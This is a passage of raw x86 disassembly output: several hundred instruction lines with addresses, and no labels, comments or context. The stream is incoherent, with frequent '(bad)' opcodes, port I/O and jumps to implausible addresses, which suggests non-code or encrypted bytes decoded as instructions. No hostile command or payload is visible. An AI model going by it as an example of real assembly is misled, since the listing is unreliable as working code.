  4026fc:	pop    esi
  4026fd:	daa    
  4026fe:	test   BYTE PTR ds:0x58969177,ch
  402704:	jl     0x402766
  402706:	add    al,0xb8
  402708:	xchg   ebx,eax
  402709:	sbb    DWORD PTR [esi],esp
  40270b:	dec    esi
  40270c:	or     bl,BYTE PTR [eax]
  40270e:	out    dx,al
  40270f:	in     al,dx
  402710:	sbb    BYTE PTR [esi+0xe149916],dh
  402716:	sbb    dl,BYTE PTR [eax-0x70cba83e]
  40271c:	(bad)  
  40271d:	fidiv  WORD PTR [eax-0x46]
  402720:	push   0x55
  402722:	dec    esi
  402723:	dec    edx
  402724:	and    BYTE PTR [ecx],dl
  402726:	cmp    al,0xaf
  402728:	pop    esi
  402729:	dec    ebx
  40272a:	and    al,0x25
  40272c:	stos   BYTE PTR es:[edi],al
  40272d:	xchg   edi,eax
  40272e:	das    
  40272f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402730:	and    ah,bh
  402732:	mov    ch,0x80
  402734:	retf   
  402735:	dec    ecx
  402736:	mov    ?,WORD PTR [ecx-0x31]
  402739:	cmp    ch,dh
  40273b:	adc    esi,ebp
  40273d:	neg    BYTE PTR [ebp+0x54]
  402740:	ds adc al,0x23
  402743:	mov    eax,ds:0x7cc5d1d2
  402748:	addr16 pop ds
  40274a:	xchg   DWORD PTR [ecx+0x3657f85e],edi
  402750:	lea    ebx,[esi+0x41]
  402753:	imul   edx,DWORD PTR [eax],0x5a
  402756:	std    
  402757:	outs   dx,DWORD PTR ds:[esi]
  402758:	out    0x2c,al
  40275a:	add    eax,DWORD PTR [ecx]
  40275c:	(bad)  [edi+0x624bf9b7]
  402762:	stos   BYTE PTR es:[edi],al
  402763:	jl     0x4027c3
  402765:	push   ebp
  402766:	xchg   ebx,eax
  402767:	mov    cl,0x7d
  402769:	daa    
  40276a:	pop    eax
  40276b:	(bad)  
  40276c:	fldcw  WORD PTR [eax-0x5210df35]
  402772:	mov    DWORD PTR [ebx+0x9ee88d6],ebp
  402778:	sub    BYTE PTR [ecx-0x7b77e016],0xfd
  40277f:	mov    al,ds:0x6c1afaf5
  402784:	icebp  
  402785:	push   ds
  402786:	xchg   esi,eax
  402787:	cs pop esi
  402789:	mov    ds:0x7b23b0dc,al
  40278e:	(bad)  
  40278f:	xor    al,0xed
  402791:	daa    
  402792:	jmp    DWORD PTR [eax-0x61ed7621]
  402798:	mov    edi,0x5d7499c2
  40279d:	pop    es
  40279e:	data16 mov WORD PTR [ecx-0x35],gs
  4027a2:	stos   BYTE PTR es:[edi],al
  4027a3:	call   0xa108ae12
  4027a8:	fst    DWORD PTR [ebx+0x7d]
  4027ab:	lahf   
  4027ac:	xchg   ecx,eax
  4027ad:	arpl   WORD PTR [eax+0x7433637e],di
  4027b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027b4:	jo     0x402776
  4027b6:	jnp    0x402776
  4027b8:	and    DWORD PTR [eax+0x4ec5a11b],edx
  4027be:	xor    BYTE PTR [eax+0x1f],bh
  4027c1:	jmp    0x402798
  4027c3:	cdq    
  4027c4:	pop    esi
  4027c5:	out    0x96,al
  4027c7:	adc    dl,BYTE PTR ds:0x40b52fc7
  4027cd:	inc    esp
  4027ce:	(bad)  
  4027cf:	jo     0x402828
  4027d1:	popa   
  4027d2:	sub    eax,0x766c3775
  4027d7:	iret   
  4027d8:	pusha  
  4027d9:	pop    edx
  4027da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027db:	add    eax,0xcb5390
  4027e0:	adc    eax,0x91bf4bf7
  4027e5:	in     eax,0xd7
  4027e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027e8:	retf   
  4027e9:	xchg   ebx,eax
  4027ea:	fsub   QWORD PTR [eax]
  4027ec:	loope  0x40280a
  4027ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027ef:	dec    edx
  4027f0:	pop    esi
  4027f1:	leave  
  4027f2:	pop    esi
  4027f3:	push   edi
  4027f4:	sbb    DWORD PTR [edx+0x41],esi
  4027f7:	sub    BYTE PTR [edi],0x52
  4027fa:	mov    esi,0xe671212
  4027ff:	jge    0x402878
  402801:	rcl    esp,cl
  402803:	pop    ds
  402804:	xor    esp,DWORD PTR [ebx+0x61435cd3]
  40280a:	cmp    esp,DWORD PTR [ebx-0x7441df6d]
  402810:	outs   dx,DWORD PTR ds:[esi]
  402811:	pusha  
  402812:	fwait
  402813:	cmc    
  402814:	dec    eax
  402815:	addr16 mov dl,0x89
  402818:	and    eax,0xc7e5eea5
  40281d:	gs jnp 0x40283e
  402820:	push   ecx
  402821:	fist   WORD PTR [edx-0x5f]
  402824:	cmp    al,0x37
  402826:	cld    
  402827:	das    
  402828:	mov    eax,ds:0x5387a3e7
  40282d:	ret    0x811
  402830:	pop    edi
  402831:	shl    DWORD PTR [edx*2-0x449c6f95],1
  402838:	bound  ebx,QWORD PTR [edx+0x75]
  40283b:	aad    0xc
  40283d:	jmp    0x4027f4
  40283f:	sbb    BYTE PTR [ebp+0x5bfaea65],0xfa
  402846:	fldcw  WORD PTR [ebp+0x28]
  402849:	mov    al,0xee
  40284b:	test   DWORD PTR [edx+ebx*1+0x70],0x6b5e5583
  402853:	push   ebx
  402854:	les    esi,FWORD PTR [edi-0x28]
  402857:	addr16 xchg esi,eax
  402859:	rol    ah,1
  40285b:	rcr    BYTE PTR [edi+0x3b],cl
  40285e:	sub    bl,ch
  402860:	cmp    BYTE PTR [ebp-0x43],ah
  402863:	adc    BYTE PTR [ebx+eiz*2-0x27],bh
  402867:	mov    al,ds:0xec96865d
  40286c:	pcmpeqb mm3,QWORD PTR [esi-0x67]
  402870:	pop    ebp
  402871:	stos   DWORD PTR es:[edi],eax
  402872:	je     0x40281f
  402874:	xchg   ebp,eax
  402875:	mov    dl,0x91
  402877:	retf   
  402878:	jp     0x402830
  40287a:	add    esp,DWORD PTR [ecx-0x2754662]
  402880:	gs mov ebx,0x785dda4d
  402886:	jp     0x40281d
  402888:	push   ecx
  402889:	push   0x24
  40288b:	or     bh,dh
  40288d:	shl    DWORD PTR [esi+0x4a4f40f7],1
  402893:	(bad)  
  402894:	in     eax,0x60
  402896:	xchg   ebx,eax
  402897:	int    0x98
  402899:	call   0xb7b88759
  40289e:	pop    eax
  40289f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028a0:	jb     0x402907
  4028a2:	out    0x26,eax
  4028a4:	dec    esi
  4028a5:	inc    edi
  4028a6:	pop    eax
  4028a7:	mov    al,0x84
  4028a9:	mov    al,ds:0x248a4f06
  4028ae:	mul    DWORD PTR [eax-0x756dece7]
  4028b4:	dec    eax
  4028b5:	jl     0x402879
  4028b7:	sti    
  4028b8:	idiv   DWORD PTR [eax-0x12]
  4028bb:	inc    edi
  4028bc:	sub    dl,bl
  4028be:	test   ecx,eax
  4028c0:	dec    ebp
  4028c1:	inc    ebp
  4028c2:	mov    ecx,0x330119a0
  4028c7:	mov    BYTE PTR ds:0x5dbfbedd,cl
  4028cd:	daa    
  4028ce:	ins    DWORD PTR es:[edi],dx
  4028cf:	mov    edi,0xb4f01ddc
  4028d4:	xchg   esi,eax
  4028d5:	pop    ds
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	test   eax,0x1b7082ab
  4028dc:	aam    0xe7
  4028de:	sub    eax,0x3029aaf2
  4028e3:	add    DWORD PTR [ecx+0x7805ee80],ebx
  4028e9:	dec    ebx
  4028ea:	pop    ds
  4028eb:	outs   dx,DWORD PTR ds:[esi]
  4028ec:	call   0xb9e873f0
  4028f1:	jecxz  0x4028cb
  4028f3:	loope  0x4028b0
  4028f5:	and    BYTE PTR [eax+0x7d],al
  4028f8:	push   es
  4028f9:	inc    esi
  4028fa:	in     eax,dx
  4028fb:	push   eax
  4028fc:	imul   edx,DWORD PTR [eax+0x41],0x1e84faa8
  402903:	mov    ebx,0xd36f43c1
  402908:	mov    edi,0x8da5461d
  40290d:	lods   al,BYTE PTR ds:[esi]
  40290e:	mov    ds:0x98e57e2e,eax
  402913:	adc    DWORD PTR [esi+0x56],ebx
  402916:	cs xchg esi,eax
  402918:	cmp    al,0x30
  40291a:	pop    ss
  40291b:	push   ecx
  40291c:	ret    
  40291d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40291e:	sub    eax,0x550c2eda
  402923:	mov    eax,ds:0xf66f45a9
  402928:	ins    DWORD PTR es:[edi],dx
  402929:	stos   DWORD PTR es:[edi],eax
  40292a:	loop   0x40295b
  40292c:	pop    edi
  40292d:	(bad)  
  40292e:	mov    dl,0x9a
  402930:	jp     0x40297f
  402932:	or     BYTE PTR [ecx],0xd9
  402935:	sbb    BYTE PTR [ecx],0xa1
  402938:	push   esi
  402939:	push   cs
  40293a:	sbb    al,0xcc
  40293c:	dec    ebx
  40293d:	leave  
  40293e:	(bad)  
  40293f:	mov    cl,0x91
  402941:	in     al,0x3f
  402943:	inc    edi
  402944:	push   ds
  402945:	cmp    BYTE PTR [esi+0x768b80e3],ah
  40294b:	test   DWORD PTR [ebp+ebx*2+0x5b],esp
  40294f:	jmp    0x611e8f6e
  402954:	push   edx
  402955:	xchg   ecx,eax
  402956:	imul   ecx,DWORD PTR [esi+ebx*2+0x58cbceb9],0xffffff8b
  40295e:	xlat   BYTE PTR ds:[ebx]
  40295f:	xor    bh,cl
  402961:	pusha  
  402962:	xor    dl,BYTE PTR [ecx]
  402964:	xlat   BYTE PTR ds:[ebx]
  402965:	adc    eax,0xddef4a48
  40296a:	out    dx,al
  40296b:	mov    edx,0x2551ca9f
  402970:	fwait
  402971:	(bad)  
  402972:	sub    BYTE PTR [ebx-0x3b],ch
  402975:	pusha  
  402976:	es int 0xb2
  402979:	lahf   
  40297a:	push   edi
  40297b:	sub    BYTE PTR [ebp-0x4f340f4a],ch
  402981:	mov    BYTE PTR [edi],bl
  402983:	add    DWORD PTR [edx],0xcb7bcf29
  402989:	pusha  
  40298a:	fbstp  TBYTE PTR [ebp-0x6dcc6c0b]
  402990:	ds int 0xee
  402993:	xchg   ebp,eax
  402994:	xchg   BYTE PTR [ecx],dl
  402996:	mov    WORD PTR ds:0x78b5ea36,?
  40299c:	pushf  
  40299d:	inc    ecx
  40299e:	xchg   DWORD PTR [eax+edi*2-0x140f7960],edx
  4029a5:	jecxz  0x4029eb
  4029a7:	test   BYTE PTR [esi+0x32],bl
  4029aa:	fxch   st(3)
  4029ac:	clc    
  4029ad:	add    ebp,eax
  4029af:	xchg   ecx,eax
  4029b0:	sbb    al,0x61
  4029b2:	xchg   ecx,eax
  4029b3:	mov    edx,DWORD PTR [ecx+0x26351cc8]
  4029b9:	add    eax,0xab63dce1
  4029be:	xor    eax,0x6d5229fb
  4029c3:	sbb    DWORD PTR [ebx+0x69604e40],0xbba0b5a6
  4029cd:	cs (bad) 
  4029cf:	xchg   esi,eax
  4029d0:	jns    0x402a0d
  4029d2:	cmc    
  4029d3:	lahf   
  4029d4:	pop    ebp
  4029d5:	test   eax,0xf1545908
  4029da:	jmp    0xa2a1b066
  4029df:	stos   DWORD PTR es:[edi],eax
  4029e0:	outs   dx,DWORD PTR ds:[esi]
  4029e1:	cmp    eax,0xede4e0ee
  4029e6:	ja     0x4029f9
  4029e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029e9:	sub    ebp,esi
  4029eb:	into   
  4029ec:	jge    0x4029a5
  4029ee:	mov    ebp,0x6a7b0b2e
  4029f3:	jmp    0x95fe8ab0
  4029f8:	(bad)  
  4029f9:	xor    eax,0x451d5451
  4029fe:	jmp    0x4029a9
  402a00:	pusha  
  402a01:	pusha  
  402a02:	not    edx
  402a04:	ja     0x4029be
  402a06:	xchg   ebx,eax
  402a07:	movd   mm4,DWORD PTR [eax+0x76]
  402a0b:	(bad)  
  402a0c:	daa    
  402a0d:	push   0x49
  402a0f:	idiv   DWORD PTR [edi-0x6434fdee]
  402a15:	scas   al,BYTE PTR es:[edi]
  402a16:	arpl   WORD PTR [ecx],sp
  402a18:	mov    WORD PTR ds:0x3d7ecfaf,?
  402a1e:	mov    eax,es:0xf448b540
  402a24:	xchg   ebp,eax
  402a25:	add    edx,DWORD PTR gs:[ebx]
  402a28:	pop    esi
  402a29:	jge    0x4029ac
  402a2b:	lock push ebp
  402a2d:	stos   DWORD PTR es:[edi],eax
  402a2e:	mov    dl,0xe1
  402a30:	or     BYTE PTR [eax+0xe],ch
  402a33:	cmp    eax,0x2562ce54
  402a38:	popa   
  402a39:	and    DWORD PTR [edx+0x61],ebx
  402a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a3d:	mov    edx,0xcc5e6f83
  402a42:	or     BYTE PTR [ebx],0xb1
  402a45:	jmp    0x4029d7
  402a47:	sub    ah,bh
  402a49:	pusha  
  402a4a:	pop    esp
  402a4b:	loop   0x4029d6
  402a4d:	(bad)  [edi+ebp*4-0xc1132de]
  402a54:	iret   
  402a55:	xchg   ebx,eax
  402a56:	mov    ebp,0xe80d9170
  402a5b:	jmp    0x96578acf
  402a60:	test   al,0xbd
  402a62:	scas   eax,DWORD PTR es:[edi]
  402a63:	mov    ch,0xc1
  402a65:	sbb    ebp,esi
  402a67:	cmp    DWORD PTR [ecx],esi
  402a69:	push   esp
  402a6a:	sbb    bh,BYTE PTR [edi-0x12]
  402a6d:	loopne 0x402a59
  402a6f:	mov    al,ds:0x700c4c38
  402a74:	sbb    bh,BYTE PTR [ebp+eax*8-0x40]
  402a78:	pop    esi
  402a79:	xor    al,0xa6
  402a7b:	mul    BYTE PTR [edi-0x5cb0765c]
  402a81:	and    eax,0x3d109fbf
  402a86:	(bad)  
  402a87:	mov    ds:0xdc1d191e,eax
  402a8c:	nop
  402a8d:	jb     0x402a7d
  402a8f:	pop    eax
  402a90:	sbb    BYTE PTR [ebp+0x1e],al
  402a93:	mov    al,ds:0xacf04156
  402a98:	xchg   edi,eax
  402a99:	add    esi,ebp
  402a9b:	sbb    eax,0xde13be05
  402aa0:	mov    dl,0x7a
  402aa2:	mov    esi,0xef538829
  402aa7:	fmul   QWORD PTR [esi-0x20]
  402aaa:	mov    dh,0x5
  402aac:	jae    0x402af0
  402aae:	sub    DWORD PTR cs:[edi],ebp
  402ab1:	add    edx,edi
  402ab3:	mov    al,ds:0x92c8a15
  402ab8:	pop    es
  402ab9:	dec    edi
  402aba:	(bad)  
  402abb:	pop    si
  402abd:	xchg   edi,eax
  402abe:	jb     0x402a97
  402ac0:	(bad)  
  402ac1:	push   cs
  402ac2:	inc    edi
  402ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ac4:	lock pusha 
  402ac6:	call   0xbba7807d
  402acb:	fcmove st,st(6)
  402acd:	sbb    esi,ebp
  402acf:	sar    BYTE PTR ss:[ecx],1
  402ad2:	test   al,0x2
  402ad4:	shr    DWORD PTR [ecx+eax*8-0x89f030e],cl
  402adb:	fistp  QWORD PTR [ecx+0x5b]
  402ade:	cli    
  402adf:	sub    ch,BYTE PTR [ebp+0x3a57ee98]
  402ae5:	sbb    DWORD PTR [esi-0x13846e9],esp
  402aeb:	ins    DWORD PTR es:[edi],dx
  402aec:	out    dx,al
  402aed:	mov    al,ds:0xaa0ca62e
  402af2:	cmp    al,BYTE PTR [ecx+0x4de7e0f7]
  402af8:	xchg   ebp,eax
  402af9:	and    dh,ch
  402afb:	fidivr WORD PTR [ecx+ebx*8]
  402afe:	(bad)  [ebx-0x39]
  402b01:	stos   BYTE PTR es:[edi],al
  402b02:	and    DWORD PTR [ecx-0x59dad546],esp
  402b08:	pop    ebx
  402b09:	icebp  
  402b0a:	sub    DWORD PTR [ebp+0x5e],edx
  402b0d:	pop    eax
  402b0e:	pop    edx
  402b0f:	ins    DWORD PTR es:[edi],dx
  402b10:	mov    esp,0x48ef437e
  402b15:	popa   
  402b16:	jmp    0x402ae5
  402b18:	sar    BYTE PTR [ecx+0x25a9239c],0xee
  402b1f:	cmp    al,0x2
  402b21:	mov    bl,0xd9
  402b23:	fmul   DWORD PTR [ebp+0x528de4b0]
  402b29:	adc    DWORD PTR [ebx+0x64],0x33
  402b2d:	cmp    al,0x9e
  402b2f:	dec    esi
  402b30:	jecxz  0x402b42
  402b32:	or     DWORD PTR [edx-0x241142ee],edx
  402b38:	out    0xac,eax
  402b3a:	dec    esi
  402b3b:	dec    eax
  402b3c:	retf   0x45c9
  402b3f:	mov    eax,ds:0xd2b28e5d
  402b44:	sbb    al,0x36
  402b46:	push   ds
  402b47:	push   ebp
  402b48:	pop    esi
  402b49:	inc    esp
  402b4a:	sub    DWORD PTR [ebx-0x602fdb63],0x2706093
  402b54:	sbb    eax,0x8ec9a3ea
  402b59:	jecxz  0x402b49
  402b5b:	std    
  402b5c:	xchg   BYTE PTR [edi+0x7c],bl
  402b5f:	popf   
  402b60:	xchg   ecx,eax
  402b61:	xchg   ebp,eax
  402b62:	and    DWORD PTR [eax+edi*1-0x2e9081cb],0xffffffe9
  402b6a:	inc    esi
  402b6b:	sbb    eax,0xb8e7170a
  402b70:	inc    ebp
  402b71:	(bad)  
  402b72:	(bad)
  402b75:	xchg   DWORD PTR [esi],ebp
  402b77:	xor    ebx,0xcaa15ac4
  402b7d:	sbb    edx,DWORD PTR [esi+eax*4-0x3a9deb8c]
  402b84:	push   0x2d
  402b86:	out    dx,al
  402b87:	jmp    0x6ab6da97
  402b8c:	daa    
  402b8d:	add    eax,0xa98a155
  402b92:	das    
  402b93:	inc    edi
  402b94:	out    dx,al
  402b95:	rcl    DWORD PTR [edi+ecx*2],1
  402b98:	pop    esi
  402b99:	shl    DWORD PTR [ebx-0x11],1
  402b9c:	jp     0x402bd0
  402b9e:	sahf   
  402b9f:	bound  edi,QWORD PTR [ecx-0x2105269c]
  402ba5:	(bad)  
  402ba6:	cdq    
  402ba7:	loop   0x402b86
  402ba9:	test   BYTE PTR [ebx+0x4160517d],al
  402baf:	je     0x402b4f
  402bb1:	cld    
  402bb2:	fidiv  WORD PTR [ecx]
  402bb4:	add    DWORD PTR [ebp+0x61020965],esp
  402bba:	aas    
  402bbb:	aaa    
  402bbc:	mov    ebp,0x4af98789
  402bc1:	xchg   bh,ch
  402bc3:	add    esp,eax
  402bc5:	fisub  DWORD PTR ds:[eax+0x5475aeb5]
  402bcc:	adc    al,0x61
  402bce:	sbb    BYTE PTR [eax+0x4188e1e9],ah
  402bd4:	adc    eax,0x5e8c6479
  402bd9:	mov    eax,DWORD PTR [edx-0x48d91d2f]
  402bdf:	data16 and ah,BYTE PTR [ecx-0x70]
  402be3:	outs   dx,DWORD PTR ds:[esi]
  402be4:	jmp    0x402c5b
  402be6:	fs mov ah,0xa3
  402be9:	cdq    
  402bea:	in     eax,dx
  402beb:	sbb    eax,0xe4cae888
  402bf0:	dec    edx
  402bf1:	scas   eax,DWORD PTR es:[edi]
  402bf2:	cmp    cl,BYTE PTR [edx-0x6ee78d54]
  402bf8:	mov    ch,0x52
  402bfa:	mov    edx,0x22085e53
  402bff:	mov    ah,0xf4
  402c01:	sub    eax,0x60c8f921
  402c06:	mov    bh,0xb5
  402c08:	data16 jbe 0x402c6c
  402c0b:	aas    
  402c0c:	imul   esp,DWORD PTR [eax+0x64],0x55
  402c10:	mov    bh,0x96
  402c12:	pop    eax
  402c13:	add    esi,ebp
  402c15:	sbb    al,0x2
  402c17:	loope  0x402c02
  402c19:	dec    edi
  402c1a:	sub    eax,0xc7fefecc
  402c1f:	jecxz  0x402bc7
  402c21:	and    edx,edi
  402c23:	mov    al,ds:0x9ecb2457
  402c28:	push   cs
  402c29:	adc    al,0xa0
  402c2b:	pop    ecx
  402c2c:	pop    esi
  402c2d:	push   edx
  402c2e:	push   ds
  402c2f:	cmp    al,0xc2
  402c31:	add    al,0x4
  402c33:	or     edx,ebx
  402c35:	pusha  
  402c36:	sbb    BYTE PTR ds:0xa9adb1e0,dl
  402c3c:	aaa    
  402c3d:	or     al,0x86
  402c3f:	sbb    DWORD PTR [ebp-0x30],esp
  402c42:	in     al,dx
  402c43:	stos   BYTE PTR es:[edi],al
  402c44:	test   DWORD PTR [eax-0x45],esp
  402c47:	out    dx,eax
  402c48:	jg     0x402c90
  402c4a:	lahf   
  402c4b:	mov    eax,ds:0xf422194b
  402c50:	adc    al,0x8d
  402c52:	xchg   ebp,eax
  402c53:	(bad)  
  402c54:	pop    esi
  402c55:	xor    cl,BYTE PTR [ecx-0x35c558f3]
  402c5b:	idiv   DWORD PTR [edx+eax*2-0x67]
  402c5f:	loope  0x402c63
  402c61:	mov    eax,ds:0x90ac787f
  402c66:	sbb    DWORD PTR [esi+0x5e],ecx
  402c69:	lock jb 0x402cc3
  402c6c:	inc    edi
  402c6d:	add    eax,0x613bd952
  402c72:	addr16 ds aaa 
  402c75:	rcl    DWORD PTR [ecx],0x6
  402c78:	ins    BYTE PTR es:[edi],dx
  402c79:	mov    eax,0x9f6adeee
  402c7e:	jb     0x402cb4
  402c80:	call   0x88e187dc
  402c85:	sbb    al,0xf6
  402c87:	mov    cl,0xc1
  402c89:	pop    ecx
  402c8a:	outs   dx,BYTE PTR ds:[esi]
  402c8b:	mov    edx,0x4ac63a59
  402c90:	(bad)  
  402c91:	jg     0x402cc1
  402c93:	xchg   esp,eax
  402c94:	xor    esi,esi
  402c96:	pop    ss
  402c97:	mov    eax,ds:0x917da450
  402c9c:	shl    BYTE PTR [eax+0x215ec4d1],cl
  402ca2:	aam    0x5
  402ca4:	sahf   
  402ca5:	outs   dx,DWORD PTR ds:[esi]
  402ca6:	xor    al,0xa9
  402ca8:	jmp    0x402d0a
  402caa:	mov    ah,BYTE PTR [edi-0x7aa783ae]
  402cb0:	xchg   DWORD PTR [ebp-0x12],ebx
  402cb3:	pop    ecx
  402cb4:	pushf  
  402cb5:	pop    edi
  402cb6:	mov    cl,0xd2
  402cb8:	xchg   ebx,eax
  402cb9:	mov    edi,ebp
  402cbb:	mov    al,ds:0xd717f7d0
  402cc0:	fiadd  WORD PTR [edx]
  402cc2:	sub    edx,0xe2bb965f
  402cc8:	jmp    0xae5871bc
  402ccd:	pop    edx
  402cce:	out    0x9,al
  402cd0:	push   0x7c76995e
  402cd5:	shr    DWORD PTR [ecx+0x18a38e03],1
  402cdb:	sbb    DWORD PTR [edi-0x30],0x45
  402cdf:	int3   
  402ce0:	div    DWORD PTR [esi+0x6e212976]
  402ce6:	(bad)  
  402ce7:	mov    al,ds:0x749e8300
  402cec:	jl     0x402ca9
  402cee:	popa   
  402cef:	jmp    0xe8e4fc45
  402cf4:	fidivr WORD PTR [ebp+edx*2+0x63]
  402cf8:	sub    BYTE PTR [eax-0x22],0x9f
  402cfc:	sub    DWORD PTR [esi-0x46e1b003],ebx
  402d02:	lock xchg esp,eax
  402d04:	adc    BYTE PTR [ecx+0x21bbfceb],dh
  402d0a:	call   0xaa41474a
  402d0f:	ret    0x6089
  402d12:	mov    dh,0x80
  402d14:	dec    ebx
  402d15:	xor    esp,DWORD PTR [edx]
  402d17:	jmp    0x7d2ef873
  402d1c:	sub    ah,BYTE PTR [ebp-0x39f2d238]
  402d22:	push   0xffffffa1
  402d24:	out    0xf0,eax
  402d26:	mov    edi,0x5d58063a
  402d2b:	sub    eax,0x6eb46a5b
  402d30:	add    al,0x37
  402d32:	mov    ebx,0x4ef22e28
  402d37:	xor    eax,eax
  402d39:	mov    ds:0xbf1fa17f,eax
  402d3e:	jle    0x402d40
  402d40:	inc    ebp
  402d41:	enter  0x6f7c,0x32
  402d45:	mov    al,ds:0x34c420c7
  402d4a:	loope  0x402d90
  402d4c:	dec    ebp
  402d4d:	aad    0xd8
  402d4f:	ins    BYTE PTR es:[edi],dx
  402d50:	into   
  402d51:	pusha  
  402d52:	sbb    bh,BYTE PTR ds:0x23abbb51
  402d58:	xchg   esp,eax
  402d59:	scas   al,BYTE PTR es:[edi]
  402d5a:	out    dx,al
  402d5b:	xlat   BYTE PTR ds:[ebx]
  402d5c:	jnp    0x402d11
  402d5e:	xor    ecx,ebx
  402d60:	adc    BYTE PTR [eax+0x2a],bl
  402d63:	mov    eax,ds:0xc445a6cd
  402d68:	stc    
  402d69:	push   esp
  402d6a:	div    DWORD PTR [esi+0x412eb65e]
  402d70:	pop    ebp
  402d71:	pop    edx
  402d72:	stos   DWORD PTR es:[edi],eax
  402d73:	loope  0x402daf
  402d75:	sub    BYTE PTR [edx-0x5c],ah
  402d78:	fidiv  WORD PTR [ebx]
  402d7a:	add    eax,0x3eb79a1b
  402d7f:	jge    0x402df6
  402d81:	jmp    0x402d61
  402d83:	dec    esp
  402d84:	pop    edi
  402d85:	push   ebp
  402d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d87:	cdq    
  402d88:	mov    edx,0xf4315ed0
  402d8d:	loope  0x402d7b
  402d8f:	jb     0x402da4
  402d91:	and    ch,BYTE PTR ds:0x7b11798d
  402d97:	mov    al,ds:0x8d4e6dc8
  402d9c:	out    dx,al
  402d9d:	dec    eax
  402d9e:	lea    eax,[ecx+esi*8+0x4582eb47]
  402da5:	xchg   esi,eax
  402da6:	mov    esp,0xd956de7
  402dab:	sub    bl,BYTE PTR [ebx-0x65]
  402dae:	outs   dx,BYTE PTR ds:[esi]
  402daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402db0:	xor    al,0x75
  402db2:	pause  
  402db4:	loope  0x402d3f
  402db6:	out    dx,al
  402db7:	inc    esi
  402db8:	jmp    0x402d45
  402dba:	and    ebp,esi
  402dbc:	sub    eax,0x61a12e21
  402dc1:	jbe    0x402e16
  402dc3:	push   ebx
  402dc4:	pop    ss
  402dc5:	adc    edi,DWORD PTR [eax-0x6af6a149]
  402dcb:	ror    esp,1
  402dcd:	xor    dh,BYTE PTR [eax+edx*2-0xc769a3f]
  402dd4:	pop    esi
  402dd5:	jp     0x402e53
  402dd7:	mov    edx,0x2ab85678
  402ddc:	pop    ebx
  402ddd:	xchg   ebp,eax
  402dde:	dec    edi
  402ddf:	idiv   BYTE PTR [edx+ebp*8+0x3b]
  402de3:	in     eax,0x3
  402de5:	mov    eax,ds:0x612e94c3
  402dea:	or     dl,cl
  402dec:	xor    DWORD PTR [edx+0x5e],ecx
  402def:	push   ebp
  402df0:	mov    esp,0xa612eecf
  402df5:	jp     0x402dec
  402df7:	or     DWORD PTR es:[ebx],ecx
  402dfa:	pop    ds
  402dfb:	lea    ebp,[esi-0x7c1edf15]
  402e01:	in     al,0xde
  402e03:	pop    edx
  402e04:	mov    cl,0x4f
  402e06:	out    dx,al
  402e07:	sub    BYTE PTR [edi-0x135a9ce2],0x3f
  402e0e:	mov    bh,0x8d
  402e10:	mov    ecx,esp
  402e12:	sbb    eax,0xd7189b24
  402e17:	cmp    eax,0x3bc8f096
  402e1c:	gs add al,0x7b
  402e1f:	fidiv  DWORD PTR [ebp+0x60]
  402e22:	rcr    DWORD PTR [eax+0x31],cl
  402e25:	adc    dl,BYTE PTR [edi-0x24b8895f]
  402e2b:	dec    edi
  402e2c:	imul   esi,DWORD PTR [ebx],0xffffffab
  402e2f:	jne    0x402ead
  402e31:	adc    al,0xee
  402e33:	in     eax,0x54
  402e35:	push   ebp
  402e36:	outs   dx,BYTE PTR ds:[esi]
  402e37:	jne    0x402e59
  402e39:	cmp    eax,esp
  402e3b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e3d:	pusha  
  402e3e:	cmp    cl,BYTE PTR [ecx+0xe]
  402e41:	add    dl,BYTE PTR [eax]
  402e43:	sub    bl,BYTE PTR ds:0x5257eee2
  402e49:	add    BYTE PTR [edx],dl
  402e4b:	mov    dl,0x21
  402e4d:	or     al,0x5c
  402e4f:	call   0x595e:0xf676e6d7
  402e56:	addr16 sbb dl,dh
  402e59:	dec    esi
  402e5a:	jmp    0x1a46f0e
  402e5f:	repnz fdivp st(0),st
  402e62:	sbb    eax,0xbb615511
  402e67:	loopne 0x402ec2
  402e69:	scas   eax,DWORD PTR es:[edi]
  402e6a:	pop    ebp
  402e6b:	sbb    edx,DWORD PTR [ebx+0x7a91eb5e]
  402e71:	lods   eax,DWORD PTR ds:[esi]
  402e72:	lock mov ecx,0x27b5d195
  402e78:	add    DWORD PTR [bx+si-0x365f],0xe
  402e7e:	leave  
  402e7f:	sub    al,0x2a
  402e81:	popa   
  402e82:	pcmpeqd mm3,mm4
  402e85:	adc    BYTE PTR [esi-0x11a19d3c],cl
  402e8b:	je     0x402eb8
  402e8d:	mov    DWORD PTR [edx],edi
  402e8f:	push   cs
  402e90:	ror    BYTE PTR [eax],0xa9
  402e93:	icebp  
  402e94:	inc    esp
  402e95:	popa   
  402e96:	aam    0xbc
  402e98:	mov    al,0xca
  402e9a:	add    eax,0xeee53b25
  402e9f:	inc    esi
  402ea0:	(bad)  
  402ea1:	retf   
  402ea2:	mov    ebx,ebp
  402ea4:	outs   dx,DWORD PTR ds:[esi]
  402ea5:	sbb    esi,DWORD PTR [ebx-0x4ea3a861]
  402eab:	jb     0x402e8b
  402ead:	inc    edi
  402eae:	jmp    0x8c2e:0xee5ec4b1
  402eb5:	push   esp
  402eb6:	and    eax,0x8e713718
  402ebb:	lods   al,BYTE PTR ds:[esi]
  402ebc:	cwde   
  402ebd:	xlat   BYTE PTR ds:[ebx]
  402ebe:	outs   dx,BYTE PTR ds:[esi]
  402ebf:	pop    es
  402ec0:	push   0x802a2840
  402ec5:	test   al,0xee
  402ec7:	jge    0x402ef3
  402ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402eca:	rcl    DWORD PTR [edi],0xd9
  402ecd:	inc    esp
  402ece:	fstp   DWORD PTR cs:[ebp-0x36]
  402ed2:	out    dx,al
  402ed3:	(bad)  
